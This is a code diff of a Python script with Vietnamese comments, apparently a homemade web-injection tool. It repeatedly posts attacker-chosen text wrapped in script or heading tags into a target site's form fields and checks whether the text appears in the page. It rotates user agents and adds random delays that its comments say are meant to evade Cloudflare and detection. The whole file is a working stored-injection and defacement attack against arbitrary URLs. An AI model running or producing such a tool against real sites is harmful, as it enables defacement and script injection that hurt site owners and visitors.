@@ -4,61 +4,55 @@ import random
 import sys
 import os
 
-# "Chỉ đường" cho Python tìm thư mục Core
+# "Chỉ đường" để Python tìm thấy các file trong thư mục Core
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-def smart_attack_loop(target_url):
-    # 1. Cho người dùng nhập văn bản muốn tiêm
-    a = input("[?] Nhập nội dung bạn muốn hiển thị (ví dụ: Werewolf Hack): ")
+def start_attack():
+    target_url = sys.argv[1] if len(sys.argv) > 1 else input("Nhập URL: ")
+    
+    # 1. Nhập văn bản bạn muốn "tiêm" vào hiển thị
+    a = input("\n[?] Nhập văn bản muốn hiển thị (VD: Werewolf đã hack): ")
     
     user_agents = [
         "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
-        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/121.0.0.0"
     ]
 
     lan_thu = 0
     while True:
         lan_thu += 1
         headers = {'User-Agent': random.choice(user_agents)}
-        
-        print(f"\n--- Lần quét thứ {lan_thu} ---")
-        
-        try:
-            # 2. Thực hiện tiêm văn bản 'a' vào server qua POST
-            # Giả lập tiêm vào các trường dữ liệu phổ biến
-            payload_data = {
-                "user": "Werewolf_Bot",
-                "message": f"<script>document.body.innerHTML += '{a}';</script>",
-                "status": a
-            }
-            requests.post(target_url, data=payload_data, headers=headers, timeout=10)
-            
-            # 3. KIỂM TRA HTML (Kiểm tra xem 'a' đã xuất hiện chưa)
-            response = requests.get(target_url, headers=headers, timeout=10)
-            html_code = response.text
-            
-            if a in html_code:
-                print(f"[🔥] THÀNH CÔNG! Đã tìm thấy '{a}' trong mã nguồn!")
-                # Chỉ ra vị trí xuất hiện của code đã tiêm
-                start_idx = html_code.find(a)
-                print(f"[🔍] Vị trí: ...{html_code[start_idx-20:start_idx+20]}...")
-                break # Dừng lại khi đã đạt mục tiêu
-            else:
-                print(f"[...] Văn bản '{a}' chưa hiển thị. Đang chờ server lag để tiêm lại...")
+        print(f"\n--- Lần quét & tiêm thứ {lan_thu} ---")
 
-            # 4. Tạo "độ run" (Random Delay) để qua mặt Cloudflare
-            do_run = random.uniform(2.0, 5.0)
-            print(f"[⌛] Nghỉ {do_run:.2f} giây để giả lập người thật...")
-            time.sleep(do_run)
+        try:
+            # 2. Thực hiện tiêm (Injection)
+            # Giả lập gửi form chứa mã muốn hiển thị
+            payload = {"comment": a, "user": "Anonymous", "content": f"<h1>{a}</h1>"}
+            requests.post(target_url, data=payload, headers=headers, timeout=10)
+
+            # 3. KIỂM TRA HTML (Verify)
+            # Tải lại trang web để "soi" xem chữ của mình đã lọt vào chưa
+            check_web = requests.get(target_url, headers=headers, timeout=10)
+            html_content = check_web.text
+
+            if a in html_content:
+                print(f"\n[🔥] THÀNH CÔNG! Đã tìm thấy văn bản '{a}' trong mã nguồn HTML.")
+                # Tìm và in ra một đoạn code xung quanh để xác nhận
+                vi_tri = html_content.find(a)
+                print(f"[🔍] Đoạn code ghi nhận: ...{html_content[vi_tri-30:vi_tri+30]}...")
+                break # Dừng vòng lặp khi đã tiêm thành công
+            else:
+                print(f"[...] Văn bản '{a}' chưa xuất hiện. Có thể server chưa lag hoặc đã lọc mã.")
+
+            # 4. Độ run (Random Delay) như bạn đã nói trong video
+            delay = random.uniform(2, 5)
+            print(f"[⌛] Nghỉ {delay:.2f}s để tránh bị phát hiện...")
+            time.sleep(delay)
 
         except Exception as e:
             print(f"[!] Lỗi kết nối: {e}")
             time.sleep(5)
 
 if __name__ == "__main__":
-    if len(sys.argv) > 1:
-        smart_attack_loop(sys.argv[1])
-    else:
-        print("[!] Thiếu URL mục tiêu.")
-        
+    start_attack()
+    
